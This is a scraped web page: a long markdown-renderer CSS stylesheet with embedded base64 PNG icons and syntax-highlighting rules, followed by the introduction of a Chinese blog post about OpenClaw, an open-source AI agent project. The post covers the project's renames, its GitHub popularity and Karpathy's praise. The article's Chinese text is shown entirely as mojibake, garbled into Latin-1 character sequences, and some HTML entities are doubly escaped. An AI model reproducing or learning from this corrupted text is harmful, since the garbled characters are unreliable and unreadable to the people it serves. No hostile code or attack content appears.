a[href^=http]:after{position:absolute;display:inline-block;width:16px;height:16px;margin-left:2px;margin-top:6px;content:"";background:url("data:image/png;base64,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");background-size:100%}.markdown-body a:active,.markdown-body a:hover{border-bottom:2px solid #5e7ce0}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #5e7ce0;border-spacing:0}.markdown-body thead{color:#fff;text-align:left}.markdown-body thead tr{background:#5e7ce0}.markdown-body thead th{border-bottom:1px solid #dfe1e6}.markdown-body tr{background-color:#fff}.markdown-body tr:nth-child(2n){background-color:#f2f5fc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#252b3a;padding:1px 23px;margin:22px 0;border-left:4px solid #5e7ce0;background-color:#f2f5fc}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{padding-left:10px;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5e7ce0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ul li::marker{content:"â€¢";color:#5e7ce0}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]:before{display:inline-block;width:16px;height:16px;content:"";background:url("data:image/png;base64,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");background-size:100%;position:relative;right:2px;top:-5px}.markdown-body input[type=checkbox]:checked:before{background:url("data:image/png;base64,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");background-size:100%}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>2026å¹´å¼€å¹´çš„AIæ™ºèƒ½ä½“é¡¹ç›®ä¸­ï¼Œ<strong>OpenClaw</strong>Â æ— ç–‘æ˜¯è¿‘æœŸæœ€å—ç©ç›®çš„ç°è±¡çº§å¼€æºæˆæœã€‚è¯¥é¡¹ç›®åœ¨ GitHub ä¸Šå¼€æºä¸åˆ°ä¸€ä¸ªæœˆï¼Œä¾¿æ–©è·è¿‘Â <strong>15 ä¸‡ Star</strong>ï¼Œçƒ­åº¦ç”šè‡³è¶…è¶Š Claude Codeã€‚æœ‰è¶£çš„æ˜¯ï¼Œå®ƒæ›¾åœ¨çŸ­çŸ­ä¸€ä¸ªæœˆå†…å†ç»ä¸‰æ¬¡æ›´åâ€”â€”ä» Clawd Bot åˆ° MoltBotï¼Œå†åˆ°å¦‚ä»Šçš„ OpenClawï¼Œå…¶è¿­ä»£ä¹‹å¿«ç”šè‡³è¶…è¿‡äº†ç¬”è€…çš„æ›´æ–‡é€Ÿåº¦ã€‚</p>
<p><strong>OpenClaw</strong> ä¸ä»…å—åˆ°å¼€å‘è€…ç¤¾åŒºçš„ç‹‚çƒ­è¿½æ§ï¼Œè¿˜è·å¾—äº† OpenAI è”åˆåˆ›å§‹äºº Karpathy çš„é«˜åº¦è¯„ä»·ï¼Œè¢«ç§°ä¸ºâ€œè¿„ä»Šä¸ºæ­¢æœ€å®ç”¨çš„æ™ºèƒ½ä½“é¡¹ç›®â€ã€‚å…¶å½±å“åŠ›ç”šè‡³æº¢å‡ºæŠ€æœ¯åœˆï¼Œä¸€åº¦å› ä¼—å¤šç”¨æˆ·äº‰ç›¸éƒ¨ç½²è€Œå¸¦åŠ¨ Mac Mini æŠ¢è´­çƒ­æ½®ï¼Œè¶³ä»¥è§è¯å®ƒçš„å—æ¬¢è¿ç¨‹åº¦ã€‚</p>
